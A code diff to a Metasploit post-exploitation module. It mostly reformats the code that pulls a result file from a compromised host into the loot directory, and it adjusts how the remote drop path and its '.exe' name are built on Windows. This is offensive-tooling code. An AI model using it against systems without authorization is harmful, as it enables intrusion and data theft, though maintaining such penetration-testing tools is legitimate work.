@@ -3,10 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Exploit::FileDropper
+  include Msf::Post::Common
 
   def initialize(info = {})
     super(update_info(info,
@@ -69,13 +69,13 @@ class MetasploitModule < Msf::Post
       register_file_for_cleanup(tmprpath)
     end
     if !datastore['RESULTFILE'].blank?
-      resultfilepath = File.join(session.fs.dir.pwd,datastore['RESULTFILE'])
-      localfile = Time.now.to_i.to_s+"-"+datastore['RESULTFILE'].delete('/\\')
-      localpath = File.join(Msf::Config.loot_directory, localfile)
+      resultfilepath = File.join(session.fs.dir.pwd, datastore['RESULTFILE'])
+      localfile      = Time.now.to_i.to_s + "-" + datastore['RESULTFILE'].delete('/\\')
+      localpath      = File.join(Msf::Config.loot_directory, localfile)
       begin
         # Download the remote file to the temporary file
         print_status_redis("Downloading #{resultfilepath} to #{localpath}")
-        session.fs.file.download_file(localpath, resultfilepath, {block_size: 100 * 1024})
+        session.fs.file.download_file(localpath, resultfilepath, { block_size: 100 * 1024 })
         register_file_for_cleanup(resultfilepath)
       rescue Rex::Post::Meterpreter::RequestError => re
         print_error(re.to_s)
@@ -92,14 +92,14 @@ class MetasploitModule < Msf::Post
   end
 
   def rpath
-    # if session.platform == "windows"
-    #   filename = '\\' + Time.now.to_i.to_s + ".exe"
-    #   datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
-    # else
-    #   filename = '/' + Time.now.to_i.to_s
-    #   datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
-    # end
-    filename = '/' + Time.now.to_i.to_s
+    if session.platform == "windows"
+      filename = '/' + Time.now.to_i.to_s + ".exe"
+      # datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
+    else
+      filename = '/' + Time.now.to_i.to_s
+      # datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
+    end
+    # filename = '/' + Time.now.to_i.to_s
     datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
   end
 
